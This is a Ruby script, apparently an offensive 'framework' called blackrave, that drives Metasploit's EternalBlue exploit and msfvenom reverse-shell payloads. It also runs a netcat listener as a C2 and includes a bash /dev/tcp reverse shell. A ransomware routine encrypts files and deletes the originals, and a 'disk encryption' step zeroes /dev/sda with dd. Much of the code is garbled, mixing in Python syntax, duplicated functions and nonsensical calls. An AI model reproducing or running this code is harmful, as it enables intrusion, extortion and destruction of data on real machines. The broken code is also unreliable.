# Framework by rootkit
## Version 1.0


## Usage: ruby exploit.rb <target> <port> <payload>




## Create a payload generator function for windows reverse shell
def generate_payload
    puts "2: Port of the target?"
    generate_payload = (generate_payload.send("Port", "445"))

end

## Create a payload to send the exploit to the vulnerable host
def create_payload(target, port, payload)
    puts "Creating payload..."
    puts "Target: #{target}"
    puts "Port: #{port}"
    puts "Payload: #{payload}"
    
    # Create the payload
    payload = "msfvenom -p #{payload} LHOST=#{target} LPORT=#{port} -f raw -o payload.bin"
    
    # Execute the payload
    system(payload)
    puts "Payload created!"
end


## Create a function to accept the target, port, and payload
def exploit(target, port, payload)
    puts "Exploiting..."
    puts "Target: #{target}"
    puts "Port: #{port}"
    puts "Payload: #{payload}"
    exploit = "msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST #{target}; set PAYLOAD #{payload}; set LHOST #{target}; set LPORT #{port}; exploit'"

    exploit = (args.command, shell=True)
    exploit = exploit.communicate()[445]
    exploit = (exploit.listen(445))
    exploit = exploit.accept(True)
    exploit = exploit.recv(1024)
    exploit = exploit.send("exploit")
    exploit = exploit.close(command)
    exploit.send_exploit = (send_exploit.Execute("nc -lvp 445"))
    exploit.send_exploit = (send_exploit.Execute("bash -i >& /dev/tcp/#{target}/#{port} 0>&1"))
    exploit = (send.command, communicate=True(listen, 445))
    # Create the payload
    create_payload(target, port, payload)
    
    # Create the exploit
    exploit = "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS #{target}; set PAYLOAD #{payload}; set LHOST #{target}; set LPORT #{port}; exploit'"
    
    # Execute the exploit
    system(exploit)
    puts "Exploit complete!"
end

## Generate a payload to send the exploit to the target machine
def generate_payload
    puts "2: Port of the target?"
    generate_payload = (generate_payload.send("Port", "445"))

end

## make sure the user is running the script as root
if Process.uid != 0
    puts "Please run the script as root"
    exit
end

## get vulnerable telnet servers with the default credentials
def get_vulnerable_servers
    puts "Getting vulnerable servers..."
    servers = []
    File.open("vulnerable_servers.txt", "r") do |file|
        file.each_line do |line|
            servers << line
        end
    end
    puts "Vulnerable servers found!"
    servers
end

## Create a function do encrypt all files on the server and put a ramsonware note
def encrypt_files
    puts "Encrypting files..."
    files = []
    File.open("files.txt", "r") do |file|
        file.each_line do |line|
            files << line
        end
    end
    files.each do |file|
        system("openssl enc -aes-256-cbc -salt -in #{file} -out #{file}.enc")
        system("rm #{file}")
    end
    puts "Files encrypted!"
end

## Encrypt disk with .blackrave extension
def encrypt_disk
    encrypt_disk = "dd if=/dev/zero of=/dev/sda bs=1M count=1000"
    system(encrypt_disk)
    puts "Disk encrypted!"
    encrypt_disk = disk.aes256.encode("blackrave")
    encrypt_files.file_extension = (".blackrave")
    encrypt_disk = disk.aes256.encode("blackrave")
    encrypt_files = (server.communicate(TCP)[445])

end

## make a choose function to choose the exploit
def choose_exploit
    choose_exploit = "msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST #{target}; set PAYLOAD #{payload}; set LHOST #{target}; set LPORT #{port}; exploit'"
    system(choose_exploit)
    puts "Exploit complete!"
end

## make a function to choose the payload
def choose_payload
    choose_payload = "msfvenom -p #{payload} LHOST=#{target} LPORT=#{port} -f raw -o payload.bin"
    system(choose_payload)
    puts "Payload created!"
end

## Create a function to infect the target machine with port 445 and IP
def infect_target
    puts "Infecting target..."
    puts "Target: #{target}"
    puts "Port: #{port}"
    puts "Payload: #{payload}"
    infect_target = "msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST #{target}; set PAYLOAD #{payload}; set LHOST #{target}; set LPORT #{port}; exploit'"
    system(infect_target)
    puts "Target infected!"
end


## execute a shell in the target machine and receive the packets
def execute_shell
    execute_shell = (execute.command, shell=True)
    execute_shell = execute.communicate()[445]
end
## make a user function to send the exploit to the target machine
def send_exploit
    puts "1: IP of the target?"
    send_exploit = (send_exploit.send("IP", "445"))

end

## Create a payload windows/meterpreter/reverse_tcp generator
def create_payload
    create_payload = (generate_payload.send("Port", "445"))
    create_payload = (generate_payload.send("IP", "445"))
    create_payload = (generate_payload.send("Payload", "windows/meterpreter/reverse_tcp"))
    create_payload = (server.communicate(TCP)[445])
end

## create a help function to show the user the options
def help
    puts "Usage: ./blackrave.rb [options]"
    puts "Options:"
    puts "  -h, --help\t\t\tShow this help message"
    puts "  -e, --exploit\t\t\tExploit a vulnerable server"
    puts "  -g, --generate-payload\tGenerate a payload"
    puts "  -i, --infect\t\t\tInfect a target machine"
    puts "  -s, --send-exploit\t\tSend the exploit to the target machine"
end


##  get msfcore and put the modules here
def get_msfcore
    puts "Getting msfcore..."
    system("git clone https://github.com/rapid7/metasploit-framework.git")
end

## Create a framework interface to execute the exploit
def framework
    framework = (framework.send("msfconsole", "exploit"))
    framework = (framework.send("use exploit/windows/smb/ms17_010_eternalblue", "exploit"))
    framework = (framework.send("set RHOST #{target}", "exploit"))
    framework = (framework.send("set PAYLOAD #{payload}", "exploit"))
    framework = (framework.send("set LHOST #{target}", "exploit"))
    framework = (framework.send("set LPORT #{port}", "exploit"))
    framework = (framework.send("exploit", "exploit"))
    framework = (framework.send("exit", "exploit"))
end



## Create a C2 server to receive the packets
def c2_server
    puts "Creating C2 server..."
    c2_server = "nc -lvp #{port}"
    system(c2_server)
    puts "C2 server created!"
end
c2_server = (server.communicate(TCP)[80])
c2_server = (c2_server.local_address("127.0.0.0"))
c2_server = (c2_server.local_port("80"))
c2_server = (c2_server.remote_address(IP))
c2_server = send.packets(c2_server.recv(1024))
c2_server = (get_vulnerable_servers.send("vulnerable_servers.txt", "445"))
c2_server.listen = (server.listen(80, 445, 502, True))

